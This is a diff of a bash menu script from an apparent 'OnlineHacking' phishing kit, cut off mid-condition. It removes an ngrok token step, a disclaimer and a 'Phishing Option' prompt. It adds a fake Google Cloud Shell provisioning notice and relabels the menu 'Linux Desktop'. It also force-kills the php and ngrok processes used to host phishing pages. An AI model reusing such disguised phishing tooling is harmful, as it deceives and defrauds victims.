@@ -1,43 +1,23 @@
 #!/bin/bash
 echo ""
-echo -e "\e[31m[\e[32m*\e[31m]\e[33m Visit \e[32mngrok.com \e[m "
-echo ""
-echo -e "\e[31m[\e[32m*\e[31m]\e[33m Sign up & get ngrok authtoken \e[m "
-echo ""
-sleep 1
-echo ""
-read -p $'\e[31m[\e[32m*\e[31m]\e[33m Enter The Ngrok Token [Ex. ./ngrok authtoken 1Y7IU ] : \e[0m' token
-$token
 echo
 echo ""
-printf "\e[31m[\e[32m★\e[31m]\e[32m This Tool is only educational purpose and we are not responsible for kind of illegal activity done by this tool\e[m "
+printf "\e[31m[\e[32m★\e[31m]\e[32m   Provisioning your Google Cloud Shell machine… Since you haven't used your Cloud Shell for a while, it may take some time to unarchive your disk. If you do not want to wait, you can enable ephemeral Cloud Shell.  \e[m "
 echo ""
 echo ""
-read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Accepted This Notice \e[1;91m (Y/N) : \e[0m' option
-echo""
-echo""
-echo""
 
-if [[ $option == *'N'* ]]; then
-clear
-exit
-fi
-if [[ $option == *'n'* ]]; then
-clear
-exit
-fi
 
 php="$(ps -efw | grep php | grep -v grep | awk '{print $2}')"
 ngrok="$(ps -efw | grep ngrok | grep -v grep | awk '{print $2}')"
 kill -9 $php
 kill -9 $ngrok
 clear
-bash OnlineHacking/Logo.sh
-bash OnlineHacking/Logo2.sh
+bash OnlineHacKing/Logo.sh
+bash OnlineHacKing/Logo2.sh
 echo ""
 echo ""
                  echo -e $''   
-                 read -p $'\e[1;91m[\e[0m\e[1;91m *** \e[0m\e[1;96m]\e[0m\e[1;96m  You Want to Choose Phishing Option  \e[1;91m  > : \e[0m' option
+                 read -p $'\e[1;91m[\e[0m\e[1;91m *** \e[0m\e[1;96m]\e[0m\e[1;96m  You Want to Linux Desktop Option  \e[1;91m  > : \e[0m' option
                  echo ""
 		 if [ $option = 01 ] || [ $option = 1 ]
                  then 
